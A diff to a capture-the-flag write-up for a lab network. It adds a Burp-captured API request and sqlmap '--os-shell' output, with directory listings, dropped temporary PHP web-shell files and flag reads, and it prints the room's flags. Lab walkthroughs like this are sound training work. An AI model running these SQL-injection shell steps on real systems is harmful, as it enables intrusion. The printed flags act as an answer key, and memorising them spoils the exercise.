@@ -425,13 +425,39 @@ if ($docDetails !== null)
 <p> 1.4. What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX} <em> Hint : /var/www/flag.txt</em><br>
 <code>{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}</code></p>
 
-<p align="center">Navigated to the path below, intercepted it with Burp Suite and saved the request to <code>req</code>.</p>
+<p align="center">Navigated to the path below, intercepted it with Burp Suite and saved the request as <code>req</code>.</p>
 
 ```bash
 http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
 ```
 
-<img width="1119" height="97" alt="image" src="https://github.com/user-attachments/assets/e9c504a7-b125-40ea-8470-53b277e98136" />
+<h6>Request</h6>
+
+```bash
+GET /api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD HTTP/1.1
+Host: 10.201.90.105
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: PHPSESSID=fpbkohs1q3un82r41fstu5eknd
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+
+<h6>Response</h6>
+
+```bash
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Sun, 31 Aug 2025 16:39:32 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Content-Length: 124
+
+Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
+```
 
 <br>
 
@@ -513,14 +539,8 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-<p align="center">Logged in</p>
-
-<img width="975" height="362" alt="image" src="https://github.com/user-attachments/assets/166a9a58-12c6-48bd-b53b-8fc06652dd12" />
 
 <br>
-
-<img width="1125" height="131" alt="image" src="https://github.com/user-attachments/assets/edf0fc73-5da6-4e2f-81b9-b8bb2b715001" />
-
 
 <br>
 <h3 align="center">Testing the suggested payloads to practice</h3>
@@ -555,6 +575,8 @@ Document ID: qxbkqXzWECvmnUcosAfIYfPrXjgLwTlDoAYsCHCowjAmHqqbqq<br />Document Na
 ```bash
 :~/Borderlands# sqlmap -r request.txt -D myfirstwebsite --os-shell
 ...
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+...
 which web application language does the web server support?
 [1] ASP
 [2] ASPX
@@ -572,43 +594,64 @@ what do you want to use for writable directory?
 ...
 use any additional custom directories [Enter for None]: /var/www
 ...
-os-shell> ls
+os-shell> ls -lah /var/www
 do you want to retrieve the command standard output? [Y/n/a] Y
 command standard output:
 ---
-CTX_WSUSpect_White_Paper.pdf
-Context_Red_Teaming_Guide.pdf
-Context_White_Paper_Pen_Test_101.pdf
-Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
-Glibc_Adventures-The_Forgotten_Chunks.pdf
-api.php
-functions.php
-home.php
-index.php
-info.php
-mobile-app-prototype.apk
-shell.php
-tmpbtnnk.php
-tmpuzdiu.php
+total 16K
+drwxr-xr-x 1 root     root     4.0K Oct 11  2019 .
+drwxr-xr-x 1 root     root     4.0K Oct  8  2019 ..
+-rw-rw-r-- 1 www-data www-data   47 Sep 18  2019 flag.txt
+drwxrwxrwx 1 root     root     4.0K Aug 31 16:44 html
 ---
-os-shell> ls /var/www
+os-shell> cat flag.txt
 do you want to retrieve the command standard output? [Y/n/a] Y
-command standard output:
----
-flag.txt
-html
----
+command standard output: 'cat: flag.txt: No such file or directory'
 os-shell> cat /var/www/flag.txt
 do you want to retrieve the command standard output? [Y/n/a] Y
 command standard output: '{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}'
 os-shell> 
+os-shell> ls -lah /var/www/html
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+total 6.4M
+drwxrwxrwx 1 root     root      4.0K Aug 31 16:44 .
+drwxr-xr-x 1 root     root      4.0K Oct 11  2019 ..
+drwxr-xr-x 8 root     root      4.0K Sep 18  2019 .git
+-r--r----- 1 www-data www-data  522K Sep  6  2019 CTX_WSUSpect_White_Paper.pdf
+-r--r----- 1 www-data www-data  803K Sep  6  2019 Context_Red_Teaming_Guide.pdf
+-r--r----- 1 www-data www-data   57K Sep  6  2019 Context_White_Paper_Pen_Test_101.pdf
+-r--r----- 1 www-data www-data  1.9M Sep  6  2019 Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
+-r--r----- 1 www-data www-data 1001K Sep  6  2019 Glibc_Adventures-The_Forgotten_Chunks.pdf
+-r--r----- 1 www-data www-data   880 Sep 10  2019 api.php
+-r--r----- 1 www-data www-data   18K Sep 10  2019 functions.php
+-r--r----- 1 www-data www-data  1.5K Sep  9  2019 home.php
+-r--r----- 1 www-data www-data   253 Sep 10  2019 index.php
+-r--r----- 1 www-data www-data    21 Sep  6  2019 info.php
+-r--r----- 1 www-data www-data  2.2M Sep 18  2019 mobile-app-prototype.apk
+-rwxr-xr-x 1 www-data www-data   866 Aug 31 16:44 tmpbuhui.php
+-rw-rw-rw- 1 mysql    mysql      766 Aug 31 16:44 tmpudatp.php
+---
+os-shell> 
 ```
+
+<img width="1263" height="759" alt="image" src="https://github.com/user-attachments/assets/40f7ce84-2939-4f7b-960b-2ba62790438b" />
+
 
 <h2 align="center">/root/ within Router1<a id='6'></a></h2>
 <br>
 <p> 1.5. What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX}<em> Hint : use python to portscan</em><br>
 <code>{FLAG:Router1:c877f00ce2b886446395150589166dcd}</code></p>
 <br>
+
+
+
+<p>Navigated to http://http://10.201.90.105/tmpudatp.php</p>
+
+<img width="1124" height="101" alt="image" src="https://github.com/user-attachments/assets/a273af44-fc86-4304-af6b-c162fe751ecc" />
+
+
 
 <h2 align="center">Transmission from server to client over UDP<a id='7'></a></h2>
 <br>
@@ -871,5 +914,17 @@ meterpreter >
 
 
 {FLAG:TCP:8fb04648d6b2bd40af6581942fcf483e}
+
+
+
+<p align="center">Launched Burp Suite and enabled FoxyProxy</p>
+<p align="center">Logged in</p>
+
+<img width="975" height="362" alt="image" src="https://github.com/user-attachments/assets/166a9a58-12c6-48bd-b53b-8fc06652dd12" />
+
+<br>
+
+<img width="1125" height="131" alt="image" src="https://github.com/user-attachments/assets/edf0fc73-5da6-4e2f-81b9-b8bb2b715001" />
+
 
 
